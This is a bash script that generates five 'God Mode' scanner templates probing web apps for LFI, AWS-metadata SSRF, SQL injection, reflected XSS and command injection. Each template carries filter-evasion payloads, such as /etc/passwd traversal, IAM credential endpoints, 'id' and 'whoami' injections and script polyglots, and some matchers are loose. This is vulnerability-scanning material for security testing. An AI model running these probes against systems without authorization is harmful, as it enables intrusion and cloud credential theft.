#!/bin/bash
# K70n0s510 GOD MODE BUILDER
# Upgrades critical templates to "Steroid" status (5+ Paths, 5+ Matchers).

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A03-injection/lfi-nuclear"
mkdir -p "$BASE_DIR/A01-access-control/ssrf-nuclear"
mkdir -p "$BASE_DIR/A03-injection/sqli-godmode"
mkdir -p "$BASE_DIR/A03-injection/xss-nuclear"
mkdir -p "$BASE_DIR/A03-injection/rce-nuclear"

echo "💉 Injecting Steroids into Templates..."

# ==========================================
# 1. GOD MODE LFI (Linux Root)
# ==========================================
cat <<EOF > "$BASE_DIR/A03-injection/lfi-nuclear/lfi-linux-godmode.yaml"
id: K70n0s510-lfi-linux-godmode
info:
  name: Linux LFI God Mode (Multi-Bypass)
  author: K70n0s510
  severity: high
  description: Tries 5 different LFI techniques to read /etc/passwd.
  tags: lfi,linux,fuzz
http:
  - method: GET
    path:
      - "{{BaseURL}}/?file=../../../../etc/passwd"                  # Standard
      - "{{BaseURL}}/?file=../../../../etc/passwd%00"              # Null Byte
      - "{{BaseURL}}/?file=....//....//....//etc/passwd"           # Filter Evasion
      - "{{BaseURL}}/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd" # Double Encode
      - "{{BaseURL}}/?path=/proc/self/root/etc/passwd"             # Proc Bypass
      - "{{BaseURL}}/static/..%2f..%2f..%2fetc/passwd"             # Nginx Off-by-slash

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        name: root-regex
        regex: ["root:.*:0:0:"]
      - type: word
        part: body
        name: daemon-user
        words: ["daemon:x:1:1:"]
      - type: word
        part: body
        name: nobody-user
        words: ["nobody:x:65534:65534:"]
      - type: word
        part: body
        name: bin-bash
        words: ["/bin/bash"]
      - type: word
        part: body
        name: debian-header
        words: ["/home/debian"]
EOF

# ==========================================
# 2. GOD MODE SSRF (AWS Takeover)
# ==========================================
cat <<EOF > "$BASE_DIR/A01-access-control/ssrf-nuclear/ssrf-aws-godmode.yaml"
id: K70n0s510-ssrf-aws-godmode
info:
  name: AWS SSRF God Mode (All Endpoints)
  author: K70n0s510
  severity: critical
  description: Hammers all known AWS metadata endpoints.
  tags: ssrf,aws,cloud
http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/user-data/"
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      - "{{BaseURL}}/?url=http://[fd00:ec2::254]/latest/meta-data/"  # IPv6 Bypass
      - "{{BaseURL}}/?dest=http://instance-data/latest/meta-data/"   # Hostname variant

    matchers-condition: or
    matchers:
      - type: word
        words: ["ami-id"]
      - type: word
        words: ["instance-id"]
      - type: word
        words: ["reservation-id"]
      - type: word
        words: ["security-credentials"]
      - type: word
        words: ["public-ipv4"]
EOF

# ==========================================
# 3. GOD MODE SQLi (Error Based)
# ==========================================
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-error-godmode.yaml"
id: K70n0s510-sqli-error-godmode
info:
  name: SQLi Error God Mode (Universal DB)
  author: K70n0s510
  severity: high
  description: Fuzzes for MySQL, PostgreSQL, MSSQL, and Oracle errors simultaneously.
  tags: sqli,error,fuzz
http:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1'"
      - "{{BaseURL}}/?id=1\""
      - "{{BaseURL}}/?id=1' OR '1'='1"
      - "{{BaseURL}}/?id=1\\\""
      - "{{BaseURL}}/?q=1' ORDER BY 100--"

    matchers-condition: or
    matchers:
      - type: word
        name: mysql-error
        words: ["You have an error in your SQL syntax", "MySQL result index"]
      - type: word
        name: postgres-error
        words: ["PostgreSQL query failed", "unterminated quoted string"]
      - type: word
        name: mssql-error
        words: ["Unclosed quotation mark", "Microsoft OLE DB Provider for SQL Server"]
      - type: word
        name: oracle-error
        words: ["ORA-00933", "ORA-01756"]
      - type: word
        name: jdbc-error
        words: ["SQLServerException", "PSQLException"]
EOF

# ==========================================
# 4. GOD MODE XSS (Polyglot Reflected)
# ==========================================
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-polyglot-godmode.yaml"
id: K70n0s510-xss-godmode
info:
  name: XSS Polyglot God Mode
  author: K70n0s510
  severity: medium
  description: Attempts 5 diverse XSS contexts (Script, Attribute, Event, SVG, Markdown).
  tags: xss,polyglot
http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=<script>alert(1)</script>"
      - "{{BaseURL}}/?search=<img src=x onerror=alert(1)>"
      - "{{BaseURL}}/?id=\" onmouseover=alert(1) \""
      - "{{BaseURL}}/?p=<svg/onload=alert(1)>"
      - "{{BaseURL}}/?val=javascript:alert(1)"

    matchers-condition: and
    matchers:
      - type: word
        name: payload-reflection
        part: body
        words:
          - "<script>alert(1)</script>"
          - "<img src=x onerror=alert(1)>"
          - "onmouseover=alert(1)"
          - "<svg/onload=alert(1)>"
      - type: word
        name: html-header
        part: header
        words: ["text/html"]
      - type: status
        status: [200]
      - type: word
        name: no-csp
        part: header
        words: ["Content-Security-Policy"]
        negative: true  # Only alert if there is NO CSP blocking us
EOF

# ==========================================
# 5. GOD MODE RCE (Command Injection)
# ==========================================
cat <<EOF > "$BASE_DIR/A03-injection/rce-nuclear/rce-godmode.yaml"
id: K70n0s510-rce-godmode
info:
  name: RCE God Mode (Universal OS)
  author: K70n0s510
  severity: critical
  description: Fuzzes for standard Linux/Windows command execution.
  tags: rce,fuzz
http:
  - method: GET
    path:
      - "{{BaseURL}}/?cmd=cat+/etc/passwd"
      - "{{BaseURL}}/?cmd=type+c:\\windows\\win.ini"
      - "{{BaseURL}}/?ip=127.0.0.1;id"
      - "{{BaseURL}}/?ping=127.0.0.1|whoami"
      - "{{BaseURL}}/?q=\$(id)"

    matchers-condition: or
    matchers:
      - type: regex
        name: linux-passwd
        regex: ["root:.*:0:0:"]
      - type: word
        name: windows-ini
        words: ["for 16-bit app support", "[fonts]"]
      - type: regex
        name: linux-id
        regex: ["uid=[0-9]+.*gid=[0-9]+"]
      - type: word
        name: windows-whoami
        words: ["nt authority\\system"]
      - type: word
        name: generic-error
        words: ["/bin/sh:"]
EOF

echo "✅ GOD MODE INSTALLED. 5 Templates on Steroids."
